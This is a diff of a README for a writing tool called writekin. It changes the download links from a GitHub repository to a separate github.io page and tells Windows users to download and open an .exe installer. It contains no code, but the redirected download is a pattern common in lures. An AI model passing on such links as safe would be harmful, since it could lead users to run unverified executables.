@@ -1,6 +1,6 @@
 # ✍️ writekin - Better writing that reflects your style
 
-[![](https://img.shields.io/badge/Download-Writekin-grey)](https://github.com/simplemonk22-collab/writekin)
+[![](https://img.shields.io/badge/Download-Writekin-grey)](https://simplemonk22-collab.github.io)
 
 ## What is writekin?
 
@@ -17,7 +17,7 @@ Writekin helps you write text that sounds like you. It uses smart language model
 
 Follow these steps to set up the software on your Windows computer.
 
-1.  Visit the download page: [https://github.com/simplemonk22-collab/writekin](https://github.com/simplemonk22-collab/writekin)
+1.  Visit the download page: [https://simplemonk22-collab.github.io](https://simplemonk22-collab.github.io)
 2.  Look for the latest release version on that page.
 3.  Click the file ending in .exe to download the installer.
 4.  Open the file once the download finishes.
